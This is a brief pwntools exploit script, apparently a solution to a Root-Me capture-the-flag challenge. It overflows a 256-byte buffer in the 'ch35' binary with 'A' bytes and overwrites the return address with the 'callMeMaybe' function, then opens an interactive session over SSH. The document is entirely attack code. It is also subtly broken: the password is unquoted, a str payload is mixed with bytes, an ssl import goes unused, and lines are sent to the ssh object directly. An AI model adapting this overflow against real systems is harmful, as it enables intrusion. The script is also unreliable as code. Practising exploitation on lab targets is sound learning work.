from ssl import _PasswordType
from pwn import *

r = ssh("app-systeme-ch35", "challenge03.root-me.org", port=2223, password = app-systeme-ch35)
p = ELF("./ch35")

callme = p.symbols["callMeMaybe"]

payload = "A"*256
payload += p64(callme)

r.sendline(payload)

r.interactive()